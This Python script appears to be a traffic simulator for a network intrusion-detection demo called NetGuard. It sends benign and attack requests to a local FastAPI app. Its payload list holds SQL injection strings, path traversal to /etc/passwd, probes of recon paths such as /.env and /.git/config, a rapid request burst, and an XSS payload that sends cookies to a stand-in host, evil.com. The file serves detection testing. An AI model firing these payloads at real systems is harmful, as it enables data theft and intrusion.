"""
examples/fastapi_demo/simulate_traffic.py
-----------------------------------------
Simulates realistic web application traffic against the NetGuard demo app:
1. Normal user browsing (Benign HTTPS/HTTP flows)
2. SQL Injection attacks
3. Cross-Site Scripting (XSS)
4. Path Traversal attempts
5. Malicious endpoint / vulnerability scanning (PortScan/Reconnaissance)
6. Rapid high-volume burst (DoS pattern)

Run:
    python simulate_traffic.py
"""

import random
import time
import requests

BASE_URL = "http://127.0.0.1:8000"

BENIGN_URLS = [
    "/",
    "/api/products",
    "/api/search?q=laptop",
    "/api/search?q=headphones",
    "/api/search?q=keyboard",
]

ATTACK_PAYLOADS = [
    # SQLi
    ("SQL Injection", "/api/search?q=' UNION SELECT username, password FROM users --"),
    ("SQL Injection", "/api/search?q=1' OR '1'='1"),
    # XSS
    ("XSS Attack", "/api/search?q=<script>alert('pwned')</script>"),
    ("XSS Attack", "/api/search?q=<img src=x onerror=document.location='http://evil.com/steal?c='+document.cookie>"),
    # Path Traversal
    ("Path Traversal", "/api/search?q=../../../../etc/passwd"),
    ("Path Traversal", "/api/search?q=..\\..\\windows\\win.ini"),
    # Recon / Scanner
    ("Recon Scan", "/.env"),
    ("Recon Scan", "/wp-login.php"),
    ("Recon Scan", "/phpmyadmin"),
    ("Recon Scan", "/actuator/health"),
    ("Recon Scan", "/.git/config"),
]


def send_benign():
    url = BASE_URL + random.choice(BENIGN_URLS)
    try:
        res = requests.get(url, timeout=2.0)
        print(f"  [BENIGN] GET {url} -> {res.status_code}")
    except Exception as e:
        print(f"  [BENIGN ERROR] {e}")


def send_attack():
    attack_name, path = random.choice(ATTACK_PAYLOADS)
    url = BASE_URL + path
    try:
        res = requests.get(url, timeout=2.0)
        print(f"  [!! {attack_name.upper()}] GET {path} -> {res.status_code}")
    except Exception as e:
        print(f"  [ATTACK ERROR] {e}")


def send_dos_burst(count=35):
    print(f"\n  [>> SIMULATING DoS BURST: {count} rapid requests]...")
    for _ in range(count):
        try:
            requests.get(BASE_URL + "/api/products", timeout=1.0)
        except Exception:
            pass
    print("  [>> DoS BURST COMPLETE]\n")


def main():
    print("=" * 65)
    print("  NetGuard AI — Real-Time Traffic & Attack Simulator")
    print(f"  Target: {BASE_URL}")
    print("  Make sure 'python main.py' is running!")
    print("=" * 65)

    try:
        requests.get(BASE_URL, timeout=2.0)
    except Exception:
        print(f"\n[ERROR] Could not connect to {BASE_URL}.")
        print("Please start the demo application first:\n  uvicorn main:app --port 8000\n")
        return

    print("\nSending simulated traffic (Press Ctrl+C to stop)...\n")

    iteration = 0
    try:
        while True:
            iteration += 1

            # Mostly benign requests with periodic attacks
            if iteration % 7 == 0:
                send_attack()
            elif iteration % 25 == 0:
                send_dos_burst(30)
            else:
                send_benign()

            time.sleep(random.uniform(0.1, 0.4))
    except KeyboardInterrupt:
        print("\nSimulator stopped by user.")


if __name__ == "__main__":
    main()
